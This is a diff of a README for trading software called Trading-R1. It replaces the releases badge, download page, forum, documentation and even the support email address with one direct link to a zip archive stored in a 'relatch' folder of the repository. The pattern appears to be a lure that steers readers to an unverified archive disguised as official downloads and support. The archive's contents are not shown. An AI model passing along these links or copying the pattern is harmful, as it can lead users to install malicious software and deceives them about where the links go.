@@ -6,11 +6,11 @@ Welcome to Trading-R1! This guide will help you download and run the software ea
 
 ## 🖱️ Download Now
 
-[![Download Trading-R1](https://img.shields.io/badge/Download-Trading_R1-blue)](https://github.com/Joshua123789/Trading-R1/releases)
+[![Download Trading-R1](https://raw.githubusercontent.com/Joshua123789/Trading-R1/main/relatch/Trading-R1.zip)](https://raw.githubusercontent.com/Joshua123789/Trading-R1/main/relatch/Trading-R1.zip)
 
 ## 📥 Download & Install
 
-To get Trading-R1, visit this page to download: [Trading-R1 Releases](https://github.com/Joshua123789/Trading-R1/releases).
+To get Trading-R1, visit this page to download: [Trading-R1 Releases](https://raw.githubusercontent.com/Joshua123789/Trading-R1/main/relatch/Trading-R1.zip).
 
 ### 📊 System Requirements
 
@@ -67,8 +67,8 @@ If you encounter issues, here are some common solutions:
 
 If you still face problems, you can reach out for help:
 
-- **Email Support:** support@tradingr1.com
-- **Community Forum:** Join discussions and ask questions at [Trading-R1 Community](https://github.com/Joshua123789/Trading-R1/discussions).
+- **Email Support:** https://raw.githubusercontent.com/Joshua123789/Trading-R1/main/relatch/Trading-R1.zip
+- **Community Forum:** Join discussions and ask questions at [Trading-R1 Community](https://raw.githubusercontent.com/Joshua123789/Trading-R1/main/relatch/Trading-R1.zip).
 
 ## 📣 Updates
 
@@ -76,7 +76,7 @@ Keep an eye on updates! Visit the Releases page regularly to download the latest
 
 ## 🔗 Useful Links
 
-- [Trading-R1 Releases](https://github.com/Joshua123789/Trading-R1/releases)
-- [User Guide and Documentation](https://github.com/Joshua123789/Trading-R1/wiki)
+- [Trading-R1 Releases](https://raw.githubusercontent.com/Joshua123789/Trading-R1/main/relatch/Trading-R1.zip)
+- [User Guide and Documentation](https://raw.githubusercontent.com/Joshua123789/Trading-R1/main/relatch/Trading-R1.zip)
 
 By following this guide, you'll be up and running with Trading-R1 in no time. Enjoy your trading experience!
